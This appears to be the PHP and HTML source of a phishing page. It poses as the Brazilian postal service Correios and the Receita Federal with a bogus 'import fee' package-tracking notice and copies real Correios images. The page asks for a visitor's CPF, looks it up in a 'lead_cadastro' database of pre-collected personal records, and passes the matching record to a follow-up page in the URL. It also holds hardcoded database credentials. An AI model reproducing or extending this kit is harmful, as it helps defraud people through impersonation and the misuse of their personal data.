<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Dados do banco de dados
    $servername = "zollim_correios";
    $username = "user";
    $password = "Zreel123!";
    $dbname = "correioscpf";

    // Criar conexão
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Verificar a conexão
    if ($conn->connect_error) {
        die("Falha na conexão: " . $conn->connect_error);
    }

    // Obter CPF do formulário
    $cpf = $_POST['cpf'];

    // Consulta SQL
    $sql = "SELECT * FROM lead_cadastro WHERE cpf = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $cpf);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        // Exibir os dados encontrados na página dados.html
        $dados_cliente = $result->fetch_assoc();
        $dados_query = http_build_query($dados_cliente);
        header("Location: rastreamento-2.php?" . $dados_query);
        exit();
    } else {
        echo "<p>CPF não encontrado.</p>";
    }

    // Fechar a conexão
    $stmt->close();
    $conn->close();
}
?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Taxa de importação (DIS) - Receita Federal</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="style2.css">


    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            overflow-x: hidden;
        }

        header {
            width: 100%;
            margin: 0;
            padding: 0;
        }

        .img-mobile, .img-desktop {
            width: 100%;
            height: auto;
        }

        /* Por padrão, ocultamos a imagem de desktop */
        .img-desktop {
            display: none;
        }

        /* Para telas acima de 768px (tablets e computadores), exibimos a imagem de desktop e ocultamos a de celular */
        @media (min-width: 768px) {
            .img-desktop {
                display: block;
            }
            .img-mobile {
                display: none;
            }
        }

        /* Estilos para a imagem e o texto sobreposto */
        .image-container {
            position: relative;
            width: 100%;
            height: auto;
            margin-top: 20px;
        }

        .image-container img {
            width: 100%;
            height: auto;
            display: block;
        }

        .text-overlay {
    position: absolute;
    color: black;
    font-size: 12px;
    font-weight: bold;
    transform: translate(-50%, -50%); /* Ajusta o posicionamento relativo ao ponto central */
}

/* Estilos para cada data em específico, utilizando unidades relativas */
.curitiba1 {
    top: 13%; /* Proporcional à altura da imagem */
    left: 20%;
}

.curitiba2 {
    top: 30%;
    left: 20%;
}

.curitiba3 {
    top: 47%;
    left: 20%;
}

.china1 {
    top: 65%;
    left: 20%;
}

.china2 {
    top: 82%;
    left: 20%;
}

        .card {
            background-color: #fff7e6;
            border-radius: 8px;
            padding: 20px;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            font-family: Arial, sans-serif;
            margin: 0 auto;
        }

        .status {
            color: #ff5e5e;
            font-weight: bold;
            margin-bottom: 10px;
        }

        .rastreamento {
            color: #333;
            margin-bottom: 10px;
        }

        .tarifa {
            color: #333;
            font-size: 18px;
            margin-bottom: 20px;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
        }

        .btn {
            background-color: #ff5e5e;
            color: white;
            padding: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 45%;
            text-align: center;
        }

        .btn:hover {
            background-color: #e14b4b;
        }

        .prazo {
            color: #555;
            font-size: 14px;
            margin-top: 20px;
            text-align: center;
        }
        .blinking-dot {
  height: 12px;
  width: 12px;
  background-color: red;
  border-radius: 50%;
  display: inline-block;
  margin-right: 5px;
  animation: blink 1.5s infinite;
}

.rastreamento {
    color: #00416B;
    font-family: "Trebuchet MS", Sans-serif;
    font-size: 24px;
    font-weight: 600;
    margin: 10px;
}

        
        .tracking-container {
    width: 90%;
    max-width: 500px;
        }
        .tracking-title {
            font-size: 24px;
            color: #003366;
            margin-bottom: 15px;
        }
        .tracking-box {
            background-color: #e8edf1;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .tracking-box h3 {
            margin-bottom: 15px;
            color: #333;
            font-size: 16px;
            font-weight: normal;
        }
        label {
            font-size: 14px;
            color: #333;
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            margin-bottom: 15px;
        }
        button {
            width: 100%;
            background-color: #007bba;
            color: white;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #005f8c;
        }
    /* Barra principal de navegação */
    nav {
      display: flex;
      align-items: center;
      background-color: #f7f7f7;
      width: 100%;
      padding: 8px 0;
      border-bottom: 2px solid #ffc107;
    }

    .menu-toggle {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      width: 50px;
    }

    .bar {
      width: 20px;
      height: 3px;
      background-color: #277AB8; /* Cor das barras */
      margin: 3px 0;
    }

    .logo {
      display: flex;
      justify-content: center;
      width: 100%;
    }

    .logo img {
      height: 25px;
    }

    .login {
      display: none;
      width: 150px;
      text-align: right;
    }

    .login a {
      display: flex;
      align-items: center;
      text-decoration: none;
      color: #005a9c;
      border-left: 1px solid #ccc;
      padding-left: 16px;
    }

    .login img {
      width: 31px;
      margin-right: 8px;
    }

    /* Estilos responsivos */
    @media (min-width: 992px) {
      .login {
        display: block;
      }

      .menu-toggle {
        display: none;
      }

        button:hover {
            background-color: #005f8c;
        }

@keyframes blink {
  0% {
    opacity: 1;
  }
  50% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}

    </style>
</head>

<body>
    <header>
    <!-- Barra de acessibilidade -->

    <!-- Barra principal de navegação -->
    <nav>
      <!-- Botão de menu -->
      <div class="menu-toggle" id="menu-toggle">
        <div class="bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
      </div>

      <!-- Logo -->
      <div class="logo">
        <a href="#">
          <img src="topo.png" alt="Logo Correios">
        </a>
      </div>

      
    </nav>
  </header>
<div>
<br>
<br>
</div>
    <h1 style="text-align: left;" class="rastreamento">Rastreamento
    </h1>
<div>
<br>
</div>
    <br>
<div class="tracking-container">
<div class="tracking-box">
<h3>Deseja acompanhar seu objeto?<br>Digite seu <strong>CPF/CNPJ</strong> para concluir o rastreamento.</h3>

<!-- Formulário HTML -->
<form action="" method="post">
<input type="text" id="cpf" name="cpf" placeholder="Digite seu CPF/CNPJ" required oninput="mascaraCPF(this)">
    <button type="submit">Consultar</button>
</form>

<script>
        function mascaraCPF(input) {
            let value = input.value;
            value = value.replace(/\D/g, ""); // Remove tudo o que não é dígito
            value = value.replace(/(\d{3})(\d)/, "$1.$2"); // Coloca um ponto após os 3 primeiros dígitos
            value = value.replace(/(\d{3})(\d)/, "$1.$2"); // Coloca um ponto após os próximos 3 dígitos
            value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2"); // Coloca um hífen antes dos últimos 2 dígitos
            input.value = value;
        }
    </script>
    
</div>
</div>
<div>
<br>
<br>
</div>
<img src="banner-atendimento.png" title="" alt="" class="image-inline" style="width: 90%; max-width: 500px; height: auto; margin: 10px auto;">
<div>
<br>
<br>
</div>
<footer id="rodape">
    <div class="recipiente largura-maxima">
        <div class="rodape-links">
            <h2>Fale Conosco</h2>
            <ul class="lista-icone">
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/monitor.png">
                        <span>Registro de Manifestações</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/duvida.png">
                        <span>Central de Atendimento</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/negocios.png">
                        <span>Soluções para o seu negócio</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/headset.png">
                        <span>Suporte ao cliente com contrato</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/ouvidoria.png">
                        <span>Ouvidoria</span>
                    </a>
                </li>
            </ul>
        </div>
        <div class="rodape-links">
            <h2>Sobre os Correios</h2>
            <ul class="lista-icone">
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/identidade.png">
                        <span>Identidade corporativa</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/educação.png">
                        <span>Educação e cultura</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/código ética.png">
                        <span>Código de ética</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/Transparência.png">
                        <span>Transparência e prestação de contas</span>
                    </a>
                </li>
                <li>
                    <a target="_blank">
                        <img class="icones-link" src="https://rastreamento.correios.com.br/core/templates/bunker/img/rodape/cadeado.png">
                        <span>Política de Privacidade e Notas Legais</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>
    <div class="copyright">&copy; Copyright 2024 Correios</div>
</footer>
 
    <script src="script.js"></script>
</body>

</html>